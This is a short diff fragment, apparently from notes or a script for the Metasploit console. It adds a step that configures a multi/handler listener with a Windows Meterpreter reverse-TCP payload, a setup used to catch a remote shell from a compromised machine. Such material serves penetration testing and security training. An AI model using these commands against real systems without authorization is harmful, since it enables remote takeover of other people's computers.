@@ -3,3 +3,6 @@ msfconsole
 
 # Set up a listener:
 use exploit/multi/handler
+
+# Configure the payload:
+set payload windows/meterpreter/reverse_tcp
